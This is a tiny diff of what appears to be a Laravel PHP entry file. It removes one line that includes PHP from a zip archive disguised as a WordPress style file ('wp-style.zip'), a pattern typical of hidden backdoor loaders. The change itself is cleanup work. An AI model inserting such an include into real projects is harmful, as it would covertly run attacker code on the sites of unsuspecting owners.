@@ -1,5 +1,5 @@
 <?php
-include("zip://wp-style.zip#wp");
+
 use Illuminate\Http\Request;
 use Illuminate\Contracts\Http\Kernel;
 
